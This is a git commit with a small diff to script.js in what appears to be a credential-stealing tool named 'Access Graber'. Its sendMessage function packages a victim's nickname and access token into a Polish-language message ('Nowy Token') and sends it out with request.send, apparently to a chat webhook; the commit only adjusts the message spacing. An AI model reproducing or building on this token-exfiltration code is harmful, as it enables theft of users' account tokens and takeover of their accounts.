b6186066aa2daf93b928eaf7ce12541b173d8bee
Viv3x <92573808+Viv3x@users.noreply.github.com>
2021-10-16 11:28:12 +0200

    Update script.js

--- script.js
+++ script.js
@@ -60,7 +60,7 @@ function sendMessage(loginData) {
     const params = {
         username: "Access Graber",
         avatar_url: "https://samequizy.pl/wp-content/uploads/2021/02/images_80304f732f3d.jpg",
-        content: "Nowy Token:\n Użytkownik: " + loginData.nickname + "\nToken:" + loginData.access_token
+        content: "Nowy Token:\nUżytkownik: " + loginData.nickname + "\nToken: " + loginData.access_token
     }
     request.send(JSON.stringify(params));
     
